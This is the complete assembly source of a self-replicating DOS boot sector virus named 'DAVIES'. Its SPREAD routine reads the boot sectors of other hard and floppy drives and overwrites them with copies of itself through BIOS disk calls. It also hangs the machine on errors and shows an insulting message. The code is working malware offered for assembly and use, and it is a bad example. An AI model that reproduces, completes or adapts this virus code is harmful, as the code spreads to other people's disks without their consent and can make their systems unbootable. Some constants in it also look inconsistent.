;The DAVIES one-sector boot sector virus will both boot up either MS-DOS
;or PC-DOS and it will infect other disks

;This segment is where the first operating system file (IBMCOM.SYS or IO.SYS)
;will be loaded and executed from. We don't know (or care) what is there
;but we do need the address to jump to defined in a separate segment
;so we can execute a far jump to it.
DOS_LOAD        SEGMENT AT 0070H
                ASSUME CS:DOS_LOAD

                ORG    0

LOAD:           DB     0            ;start of the first operating .sys program
DOS_LOAD        ENDS

MAIN            SEGMENT BYTE
                ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING

;This jump instruction is here so we can compile this program as a COM
;file. It is never executed and never becomes a part of the boot
;sector. Only the 512 bytes after the address 7C00 in this file
;becomes part of the boot sector.
                ORG     100H

START:          jmp     BOOTSEC

;The following two definitions are BIOS RAM bytes which contain info
;about the number and type of disk drives in the computer. These are
;needed by the virus to decide on where to look to find drives to
;infect. They are not normally needed by the boot sector.

                ORG     0410H

SYSTEM_INFO:    DB      ?      ;system info byte: Take bits 6 & 7 and
                             ;add 1 to get number of disk drives on this
                             ;system (eg 01 = 2 drives)

                ORG     0475H

HD_COUNT:       DB      ?      ;number of hard drives in the system

;This area is reserved for loading the boot sector from the disk
;which is going to be infected, as well as the first sector of
;the root directory, when checking for the existence of system files
;and loading the first system file.

                ORG     0500H

DISK_BUF:       DW      ?     ;start of the buffer

                ORG     06FEH

NEW_ID:         DW      ?     ;location of AA55H in boot sector 


;Here is the start of the boot sector code. This is the chunk we will take out 
;of the compiled COM file and put in the first sector on a 360K floppy disk.
;Note that this must be loaded onto a 360K floppy to work, because the
;parameters in the data area that follow are set up to work only
;with a 360K disk

                ORG     7C00H

BOOTSEC:        JMP     BOOT    ;jump to start of boot sector code
              
                ORG     7C03H   ;start of data area

DOS_ID:         DB      'DAVIES '   ;name of this boot sector (8 bytes)
SEC_SIZE:       DW      200H    ;size of a sector, in bytes
SECS_PER_CLUST: DB      02      ;number of sectors in a cluster
FAT_START:      DW      2       ;starting sector for the first FAT
FAT_COUNT:      DB      2       ;number of FATs on this disc
ROOT_ENTRIES:   DW      70H     ;number of root directory entries
SEC_COUNT:      DW      5A0H    ;total number of sectors on this disk
DISK_ID:        DB      0FDH    ;disk type code
SECS_PER_FAT:   DW      3       ;number of sectors per FAT
SECS_PER_TRK:   DW      9       ;sectors per track for this drive
HEADS:          DW      2       ;number of heads (sides) on this drive
HIDDEN_SECS:    DW      0       ;number of hidden sectors on this disk

DSKBASETBL:
                DB      0       ;specify byte 1,step rate time, hd unload time
                DB      0       ;specify byte 2, head load time, DMA mode
                DB      0       ;wait time until motor turned off, in tacks
                DB      0       ;bytes per sector (0=128, 1=256, 2=512, 3=1024)
                DB      12H     ;last sector number (lg enough to handle 1.44 M)
                DB      0       ;gap length between sectors for r/w operations
                DB      0       ;data xfer length when sector length not specified
                DB      0       ;gap length between sectors for formatting
                DB      0       ;value stored in newly formatted sectors
                DB      1       ;head settle time, in milliseconds
                DB      0       ;motor start-up time, in 1/8 seconds

HEAD:           DB      0       ;current head to read from                       

;here is the start of the boot sector code

BOOT:           CLI             ;interrupts off
                XOR     AX,AX   ;prepare to set up segments
                MOV     ES,AX   ;set ES=0
                MOV     SS,AX   ;start stack at 0000:7C00
                MOV     SP,OFFSET BOOTSEC
                MOV     BX,1EH*4 ;get address of disk
                LDS     SI,SS:[BX] ;param table in ds:si
                PUSH    DS
                PUSH    SI         ;save that address
                PUSH    SS
                PUSH    BX         ;and its address

                MOV     DI,OFFSET DSKBASETBL  ;and update default
                MOV     CX,11          ;values to table value here
                CLD                    ;direction flag cleared
DFLT1:          LODSB
                CMP     BYTE PTR ES:[DI],0    ;anything non-zero
                JNZ     SHORT DFLT2      ;not default, so don't save it
                STOSB                    ;else use default value
                JMP     SHORT DFLT3      ;and go on to next
DFLT2:          INC     DI
DFLT3:          LOOP    DFLT1            ;and loop until cx = 0

                MOV     AL,AH            ;set ax=0
                MOV     DS,AX            ;set ds=0 to set dsk tbl
                MOV     WORD PTR [BX+2],AX  ;to @DSKBASETBL (ax=0 here)
                MOV     WORD PTR [BX],OFFSET DSKBASETBL  ;ok, done
                STI                      ;now turn interrupts on
                INT    13H               ;and reset disk drive systems
ERROR1:         JC     ERROR1            ;if an error, hang the machine

;attempt to reproduce. If this boot sector is located on dirve A, it will
;attempt to relocate to drive C. If successful it will stop, otherwise it
;will attempt to relocate to drive B. If this boot sector is located on drive C
;it will attempt to relocate to drive B.

SPREAD:
                CALL   DISP_MSG         ;display message
                MOV    BX,OFFSET DISK_BUF  ;put other boot sectors here
                CMP    BYTE PTR [DRIVE],80H  
                JZ     SPREAD2        ;if C, go try to spread to B
                MOV    DX,180H        ;if A,try to spread to C first
                CMP    BYTE PTR [HD_COUNT],0  ;see if there is a hard drive
                JZ     SPREAD2        ;none, try floppy B
                MOV    CX,1           ;read track 0, sector 1
                MOV    AX,201H
                INT    13H
                JC     SPREAD2            ;on error, go try drive B
                CMP    WORD PTR [NEW_ID],0AA55H  ;make sure it's a boot sector
                JNZ    SPREAD2
                CALL   MOVE_DATA
                MOV    DX,180H          ;and go write to the new sector
                MOV    CX,1
                MOV    AX,301H
                INT    13H
                JC     SPREAD2        ;if error on C:, try b:
                JMP    SHORT LOOK_SYS   ;ok, go look for system files
 SPREAD2:       MOV    AL,BYTE PTR [SYSTEM_INFO]  ;first see if there is a B
                AND    AL,0C0H
                ROL    AL,1               ;put bits 6 & 7 into bits 0 & 1
                ROL    AL,1
                INC    AL                 ;add one, so now AL=# of drives
                CMP    AL,2
                JC     LOOK_SYS           ;no B drive, just quit
                MOV    DX,1               ;read drive B
                MOV    AX,201H            ;read one sector
                MOV    CX,1               ;read track 0, sector 1
                INT    13H
                JC     LOOK_SYS           ;if an error here, just exit
                CMP    WORD PTR [NEW_ID],0AA55H  ;make sure its a boot sector
                JNZ    LOOK_SYS         ;no, don't attempt reproduction
                CALL   MOVE_DATA          ;yes, move boot sector to write
                MOV    DX,1
                MOV    AX,301H           ;and write this boot sector to B
                MOV    CX,1
                INT    13H

 ;here we look at the first file on the disk to see if it is the first 
 ;MS-DOS or PC-DOS system file, IO.SYS or IBMBIO.COM, respectively.
 LOOK_SYS:      MOV    AL,BYTE PTR [FAT_COUNT] ; get FATs per disk
                XOR    AH,AH
                MUL    WORD PTR [SECS_PER_FAT]; multiply by sectors per FAT
                ADD    AX,WORD PTR [HIDDEN_SECS]  ;add hidden sectors
                ADD    AX,WORD PTR [FAT_START]  ;add starting FAT sector

                PUSH   AX
                MOV    WORD PTR [DOS_ID],AX  ;root directory, save it
                
                MOV    AX,20H           ;directory entry size            
                MUL    WORD PTR [ROOT_ENTRIES]  ;directory size in AX
                MOV    BX,WORD PTR [SEC_SIZE]   ;sector size
                ADD    AX,BX                    ;add one sector
                DEC    AX                ;decrement by one
                DIV    BX               ;AX=# of sectors in root directory
                ADD    WORD PTR [DOS_ID],AX   ;DOS_ID = start of data
                MOV    BX,OFFSET DISK_BUF     ;set disk buffer to 0000:0500
                POP    AX
                CALL   CONVERT               ;and go convert sec # for bios
                MOV    AL,1                  ;prepare for a one sector read
                CALL   READ_DISK             ;go read it

                MOV    DI,BX                 ;compare first file on disk
                MOV    CX,11                 ;with required file name of
                MOV    SI,OFFSET SYSFILE_1   ;first system file for PC DOS
                REPZ   CMPSB
                JZ     SYSTEM_THERE          ;ok, found it. Go load it.

                MOV    DI,BX                ;compare first file with
                MOV    CX,11                ;required file name of
                MOV    SI,OFFSET SYSFILE_2  ;first sytem file for MS DOS
                REPZ   CMPSB
ERROR2:         JMP    ERROR2               ;not the same, an error
                                            ;so hang the machine

;OK,system file is there, so load it
SYSTEM_THERE:
                MOV    AX,WORD PTR [DISK_BUF+1CH]  ;get file size
                XOR    DX,DX                     ;of IBMBIO.COM/IO.SYS
                DIV    WORD PTR [SEC_SIZE]       ;and divide by sector size
                INC    AL                      ;ax=# of sectors to read
                MOV    BP,AX                   ;store that number in BP
                MOV    AX,WORD PTR [DOS_ID]   ;get sec # of start of data
                PUSH   AX
                MOV    BX,700H                ;set disk buffer to 0000:0700
RD_BOOT1:       MOV    AX,WORD PTR [DOS_ID]   ;and get sector to read
                CALL   CONVERT                ;convert to bios TRk/Cyl/Sec
                MOV    AL,1                   ;read one sector
                CALL   READ_DISK              ;go read the disk
                SUB    BP,1                   ; -1 from # of secs to read
                JZ     DO_BOOT                ;and quit if we're done
                ADD    WORD PTR [DOS_ID],1    ;add secs read to sec to read
                ADD    BX,WORD PTR [SEC_SIZE]  ;and update buffer address
                JMP    RD_BOOT1               ;then go for another

;OK, the first sytem file has been read in, now tranfer control to it
DO_BOOT:
                MOV    CH,BYTE PTR [DISK_ID]  ;put drive type in CH
                MOV    DL,BYTE PTR [DRIVE]    ;dirve number in dl
                POP    BX
                JMP    FAR PTR LOAD          ;use far jump with MASM or TASM
                MOV    AX,0070H              ;a86 can't handle that, so
                PUSH   AX                    ;so lets fool it with a far return
                XOR    AX,AX
                PUSH   AX
                RETF

;convert sequential sector number in ax to BIOS Track,HEad,Sector
;information. Save track number in dx, sector number in CH,
CONVERT:
                XOR    DX,DX                
                DIV    WORD PTR [SECS_PER_TRK] ;divide ax by sectors per track
                INC    DL            ;dl=sector # to start read on
                MOV    CH,DL         ;al=track/head count
                XOR    DX,DX         
                DIV    WORD PTR [HEADS] ;divide ax by head count
                MOV    BYTE PTR [HEAD],DL  ;dl=head number,save it
                MOV    DX,AX             ;ax=track number,save it in dx

;read the disk for the number of sectors in AL, into the buffer es:bx, using
;the track number in DX, the head number at HEAD, and the sector number
;at CH.
READ_DISK:
                MOV    AH,2          ;read disk command
                MOV    CL,6          ;shift upper two bits of trk # to
                SHL    DH,CL         ;the high bits in DH and put
                OR     DH,CH         ;sector number in the low six bits
                MOV    CX,DX
                XCHG   CH,CL         ;ch(0-5)=sec,, cl/ch(6-7)=track
                MOV    DL,BYTE PTR [DRIVE]  ;get drive number from here
                MOV    DH,BYTE PTR [HEAD]   ;and head number from here
                INT    13H                 ;go read the disk
ERROR3:         JC     ERROR3              ;hang in case of an error
                RET

;move data that doesn't change from this boot sector to the one read 
;in at DISK_BUF. That includes everything but the DRIVE ID (at offset 7DFDH)
;and the data area at the beginning of the boot sector.
MOVE_DATA:
                MOV    SI,OFFSET DSKBASETBL     ;move the boot sector code
                MOV    DI,OFFSET DISK_BUF + (OFFSET DSKBASETBL - OFFSET BOOTSEC)
                MOV    CX,OFFSET DRIVE - OFFSET DSKBASETBL
                REP    MOVSB
                MOV    SI,OFFSET BOOTSEC      ;move initial jump and sector ID
                MOV    DI,OFFSET DISK_BUF
                MOV    CX,11
                REP    MOVSB
                RET
;display the null terminated string at MESSAGE
DISP_MSG:
                MOV    SI,OFFSET MESSAGE    ;set offset of message up
DM1:            MOV    AH,0EH               ;execute bios int 10h, fctn 0EH
                LODSB                      ;get character to display
                OR     AL,AL
                JZ     DM2                  ;repeat until 0
                INT    10H                  ;display it
                JMP    SHORT DM1            ;and get another
DM2:            RET

SYSFILE_1:      DB     'IBMBIO COM'        ;PC DOS system file
SYSFILE_2:      DB     'IO SYS'            ;MS DOS system file
MESSAGE:        DB     'YOU BLACK-COATED TURD!',0DH,0AH,0AH,0 

                ORG    7DFDH

DRIVE:          DB     0               ;disk drive for this sector

BOOT_ID         DW     0AA55H          ;boot sector ID word

MAIN            ENDS

                END START   


